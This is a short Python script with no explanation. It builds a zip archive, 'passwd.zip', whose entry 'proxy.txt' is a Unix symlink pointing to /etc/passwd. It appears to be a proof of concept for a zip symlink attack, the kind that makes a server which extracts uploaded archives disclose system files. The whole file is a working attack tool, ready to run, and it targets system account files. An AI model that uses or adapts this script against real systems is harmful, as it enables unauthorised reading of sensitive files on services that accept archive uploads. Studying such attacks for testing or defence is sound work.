#!/usr/bin/python
import stat
from zipfile import ZipInfo, ZipFile, ZIP_DEFLATED

def create_zip_with_symlink(filename, source, target):
    info = ZipInfo(source)
    info.create_system = 3 # Unix
    st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
    info.external_attr = st_mode << 16

    file = ZipFile(filename, 'w', compression=ZIP_DEFLATED)
    file.writestr(info, target)
    file.close()

create_zip_with_symlink('passwd.zip', 'proxy.txt', '/etc/passwd')